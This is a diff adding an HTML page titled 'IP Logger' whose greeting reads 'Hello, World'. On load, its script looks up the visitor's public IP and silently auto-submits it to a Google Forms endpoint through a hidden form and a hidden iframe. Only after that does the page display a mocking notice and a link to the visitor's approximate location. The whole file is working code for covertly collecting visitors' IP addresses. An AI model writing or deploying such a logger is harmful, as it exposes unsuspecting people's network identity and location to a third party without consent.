@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Logger</title>
+  <script>
+    async function logIP() {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+
+      // Fill hidden form input
+      document.getElementById('ip').value = ip;
+
+      // Auto-submit the form
+      document.getElementById('logForm').submit();
+
+      // Display location link
+      document.getElementById('location-link').innerHTML =
+        `here is your location => <a href="https://ipinfo.io/${ip}" target="_blank">https://ipinfo.io/${ip}</a>`;
+    }
+
+    window.onload = logIP;
+  </script>
+</head>
+<body>
+  <h1>Hello, World</h1>
+  <span style="color: red;">Your IP Address is sent.😝</span>
+  <div id="location-link" style="margin-top: 10px;"></div>
+
+  <form id="logForm"
+        action="https://docs.google.com/forms/d/e/1FAIpQLSfw5V0tYcuX7ZsZ0pROTgo69GyhSVWZuDBD9vaRn3cyAq4lgg/formResponse"
+        method="POST"
+        target="hidden_iframe">
+    <input type="hidden" name="entry.387733143" id="ip">
+  </form>
+
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
+</body>
+</html>
